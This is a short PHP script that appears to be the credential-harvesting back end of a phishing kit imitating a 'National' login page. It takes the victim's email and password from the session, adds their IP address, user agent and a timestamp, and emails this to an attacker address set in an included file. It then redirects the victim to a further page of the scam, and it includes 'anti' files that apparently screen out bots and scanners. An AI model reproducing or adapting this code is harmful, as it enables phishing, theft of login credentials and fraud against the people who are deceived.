<?php
session_start();
include "email.php";
include './prevents/anti7.php';
	include './prevents/anti8.php';
	include './prevents/anti9.php';



$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");



$cc1 = $_SESSION['identity'];
$pp = $_SESSION['password'];
$data ="
=============## NATIONAL LOGIN ##==================
|EMAIL : $cc1
|PASS : $pp
============## Goodies ##=======================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="#NATIO #$ip  $cc1 $pp";
if(preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $cc1)){
	
mail($emailusr, $subj, $data);

header("Location: ./quest.php");
}
else{
	echo "<meta http-equiv='refresh' content='0;url=index.php'>";
}




	


?>